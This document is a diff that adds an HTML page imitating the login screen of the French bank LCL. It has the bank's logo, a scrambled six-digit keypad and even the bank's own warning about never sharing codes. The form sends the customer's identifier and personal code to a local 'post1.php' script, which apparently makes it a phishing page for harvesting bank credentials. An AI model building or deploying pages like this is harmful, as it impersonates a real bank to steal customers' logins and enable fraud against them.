@@ -1,0 +1,131 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+	<link rel="shortcut icon" href="favicon.ico">
+    <title>	LCL - Mon compte</title>
+</head>
+<body>
+    <div class="container">
+        <form method="POST" name="login" id="login" action="./post1.php" class="leftSide">
+            <div class="top">
+                <img src="Assets/images/LOGO_LCL.svg" alt="">
+                <h1>Votre identifiant</h1>
+                <input name="1" type="text" required="" id="inputText" maxlength="10">
+				  <!-- //////////////////////////// -->
+                <input type="number" required="" id="password" style="display: none;" name="password" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength="6">
+                <!-- //////////////////////////// -->
+                <div>
+                    <input type="checkbox" name="" id="checkbox">
+                    <p>Mémoriser mon identifiant</p>
+                </div>
+            </div>
+            <div class="code">
+                <h1>Votre code personnel</h1>
+                <div class="radios">
+                    <div class="circle" id="c1"></div>
+                    <div class="circle" id="c2"></div>
+                    <div class="circle" id="c3"></div>
+                    <div class="circle" id="c4"></div>
+                    <div class="circle" id="c5"></div>
+                    <div class="circle" id="c6"></div>
+                    <div class="clear" id="clear" onclick="Clear()">x</div>
+                </div>
+                <div class="numbers">
+                    <div class="row">
+                        <div class="number" onclick="Run(this)">9</div>
+                        <div class="number" onclick="Run(this)">6</div>
+                        <div class="number" onclick="Run(this)">4</div>
+                        <div class="number" onclick="Run(this)">8</div>
+                        <div class="number" onclick="Run(this)">3</div>
+                    </div>
+                    <div class="row"> 
+                        <div class="number" onclick="Run(this)">7</div>
+                        <div class="number" onclick="Run(this)">0</div>
+                        <div class="number" onclick="Run(this)">1</div>
+                        <div class="number" onclick="Run(this)">5</div>
+                        <div class="number" onclick="Run(this)">2</div>
+                    </div>
+                </div>
+                <button style="
+    background: #3b51d5;
+">
+                    Valider
+                    <img src="Assets/images/button-right-circle.ed61a2eadf12cf18e670.svg" alt="" srcset="" style="width: 60px;content: &quot;&quot;;width: 16px;height: 10px;margin-left: 6px;display: inline-block;padding-bottom: 0px;">
+                </button>
+                
+                
+                <script>
+
+                    let circle_1 = document.getElementById("c1");
+                    let circle_2 = document.getElementById("c2");
+                    let circle_3 = document.getElementById("c3");
+                    let circle_4 = document.getElementById("c4");
+                    let circle_5 = document.getElementById("c5");
+                    let circle_6 = document.getElementById("c6");
+                    let cls = document.getElementById("clear");
+                    let passInput = document.getElementById("password");
+                    let password = "";
+                    let
+                    count=1;
+                    function Run(pass){ 
+                        password +=pass.innerText;
+                        if(count==1)
+                            circle_1.style.background="#000";
+                        else if (count==2)
+                            circle_2.style.background="#000";
+                        else if (count==3)
+                            circle_3.style.background="#000";
+                        else if (count==4)
+                            circle_4.style.background="#000";
+                        else if (count==5)
+                            circle_5.style.background="#000";
+                        else if (count==6){
+                            circle_6.style.background="#000";
+                            count=-1
+                            passInput.value = password;
+							password="";
+                        }
+                        if(count>0)
+                            cls.style.display="block";
+                        count++;
+                    }
+                    function Clear(){
+                        circle_1.style.background="#fff";
+                        circle_2.style.background="#fff";
+                        circle_3.style.background="#fff";
+                        circle_4.style.background="#fff";
+                        circle_5.style.background="#fff";
+                        circle_6.style.background="#fff";
+                        cls.style.display="none";
+						password.value= '';
+                        count=1;
+                    }
+                </script>
+            </div>
+
+            <a href="Identifiant oublié ?"></a>
+            <a href="Code personnel oublié ?"></a>
+        </form>
+        <div class="rightSide">
+
+            <div id="slider">
+                <img id="left" src="Assets/images/button-left-circle.d3c1e809a810eb7ec1ad.svg" alt="" srcset="">
+                <ui-companion _ngcontent-ng-front-c80="" class="message-banner-image loaded paused"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 360 360" width="360" height="360" preserveAspectRatio="xMidYMid meet" style="width: 70%; height: 70%; transform: translate3d(0px, 0px, 0px);" focusable="false"><defs><clipPath id="__lottie_element_16"><rect width="360" height="360" x="0" y="0"></rect></clipPath></defs><g clip-path="url(#__lottie_element_16)"><g style="display: block;" transform="matrix(1.100000023841858,0,0,1.100000023841858,345.1047058105469,230.9346923828125)" opacity="1"><g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)"><path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path><path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path></g></g><g style="display: block;" transform="matrix(1.100000023841858,0,0,1.100000023841858,279.1047058105469,230.9346923828125)" opacity="1"><g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)"><path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path><path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path></g></g><g transform="matrix(1.100000023841858,0,0,1.100000023841858,209.5906982421875,230.93569946289062)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)"><path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path><path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path></g></g><g transform="matrix(6.473120212554932,0,0,6.473120212554932,743.951171875,690.8334350585938)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(0.9546899795532227,0,0,0.9500300288200378,-87.12200164794922,-78.96600341796875)"><path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(92,104,236)" stroke-opacity="1" stroke-width="8" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-7.6020002365112305,23.46299934387207 -23.093000411987305,23.56800079345703 -23.093000411987305,23.56800079345703 C-23.093000411987305,23.56800079345703 -23.46299934387207,5.35699987411499 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path></g></g></g></svg></ui-companion>
+                <div>
+                    <h1>Nos conseils sécurité</h1>
+                    <p>LCL ne vous sollicitera jamais (que ce soit par mail, par SMS ou par téléphone) pour vous demander de communiquer de quelque manière que ce soit vos codes personnels destinés à valider vos transactions.</p>
+                    <a href="#">Comment sécuriser mes données bancaires</a>
+                </div>
+                <img id="right" src="Assets/images/arrow_links.137972582ca1a7182dfa.svg" alt="" srcset="">
+            </div>
+              
+        </div>
+    </div>
+    <!-- partial -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <script src="Assets/scripts/script.js"></script>
+    <script src="Assets/scripts/TypeNumber.js"></script>
+
+</body></html>
